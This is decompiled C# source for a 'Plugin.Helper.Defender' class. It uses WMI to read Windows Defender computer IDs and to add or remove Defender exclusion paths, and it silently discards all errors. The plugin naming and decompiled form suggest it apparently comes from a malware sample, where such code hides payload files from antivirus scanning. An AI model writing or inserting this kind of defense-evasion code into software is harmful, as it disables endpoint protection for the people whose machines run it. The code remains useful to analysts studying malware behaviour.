using System;
using System.Collections.Generic;
using System.Management;

namespace Plugin.Helper;

internal class Defender
{
	public static string[] ComputerId()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		List<string> list = new List<string>();
		ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\Microsoft\\Windows\\Defender", "SELECT * FROM MSFT_MpPreference").Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val = (ManagementObject)enumerator.Current;
				list.Add(((ManagementBaseObject)val)["ComputerID"].ToString());
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return list.ToArray();
	}

	public static void RemoveExclusion(string[] paths)
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string[] array = ComputerId();
			foreach (string text in array)
			{
				try
				{
					string text2 = "MSFT_MpPreference.ComputerID='" + text + "'";
					ManagementObject val = new ManagementObject("root\\Microsoft\\Windows\\Defender", text2, (ObjectGetOptions)null);
					ManagementBaseObject methodParameters = val.GetMethodParameters("Remove");
					methodParameters["ExclusionPath"] = paths;
					val.InvokeMethod("Remove", methodParameters, (InvokeMethodOptions)null);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	public static void AddExclusion(string[] paths)
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string[] array = ComputerId();
			foreach (string text in array)
			{
				try
				{
					string text2 = "MSFT_MpPreference.ComputerID='" + text + "'";
					ManagementObject val = new ManagementObject("root\\Microsoft\\Windows\\Defender", text2, (ObjectGetOptions)null);
					ManagementBaseObject methodParameters = val.GetMethodParameters("Add");
					methodParameters["ExclusionPath"] = paths;
					val.InvokeMethod("Add", methodParameters, (InvokeMethodOptions)null);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}
}
